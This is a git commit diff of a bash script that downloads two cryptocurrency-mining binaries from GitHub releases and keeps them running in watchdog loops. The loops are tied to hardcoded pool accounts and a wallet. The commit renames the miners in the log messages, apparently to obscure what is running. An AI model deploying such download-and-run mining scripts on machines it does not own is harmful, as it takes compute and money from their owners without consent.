4bdba9b671319ccf684d1d3317d74aeb61285ea5
techne <108133282+varfeplas@users.noreply.github.com>
2025-01-03 01:54:44 +0530

    Update cpols.sh

--- cpols.sh
+++ cpols.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-apt update -y && apt install -y screen git curl cron nano mc htop iputils-ping
+apt update -y && apt install -y screen git curl
 curl -L https://github.com/varfeplas/aplmn/releases/download/qpood/aplnrs -o /tmp/aplnrs
 curl -L https://github.com/egg5233/ore-hq-client/releases/download/v1.2.0/ore-hq-client -o /tmp/ore-hq-client
 chmod +x ore-hq-client
@@ -7,9 +7,9 @@ chmod +x aplnrs
 #!/bin/bash
 while true; do
 if pgrep -f "aplnrs" > /dev/null; then
-        echo -e "$(date +"%Y-%m-%d %H:%M:%S")  ---  apoolminer is running , doing nothing"
+        echo -e "$(date +"%Y-%m-%d %H:%M:%S")  ---  aplnrs is running , doing nothing"
 else
-        echo -e "$(date +"%Y-%m-%d %H:%M:%S")  ---  No apoollminer , running apoolminer"
+        echo -e "$(date +"%Y-%m-%d %H:%M:%S")  ---  No aplnrs , running aplnrs"
         ./aplnrs --account CP_udnvh2owpq --pool qubic1.hk.apool.io:3334 --worker $1
 fi
 done
@@ -17,9 +17,9 @@ EOF
 #!/bin/bash
 while true; do
 if pgrep -f "ore-hq-client" > /dev/null; then
-        echo -e "$(date +"%Y-%m-%d %H:%M:%S")  ---  gpoolminer is running , doing nothing"
+        echo -e "$(date +"%Y-%m-%d %H:%M:%S")  ---  ore-hq-client is running , doing nothing"
 else
-        echo -e "$(date +"%Y-%m-%d %H:%M:%S")  ---  No gpoolminer , running gpoolminer"
+        echo -e "$(date +"%Y-%m-%d %H:%M:%S")  ---  No ore-hq-client , running ore-hq-client"
         ./ore-hq-client --url ws://ore.tw-pool.com:5487/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.V60000 --cores 8 --mode 2
 fi
 done
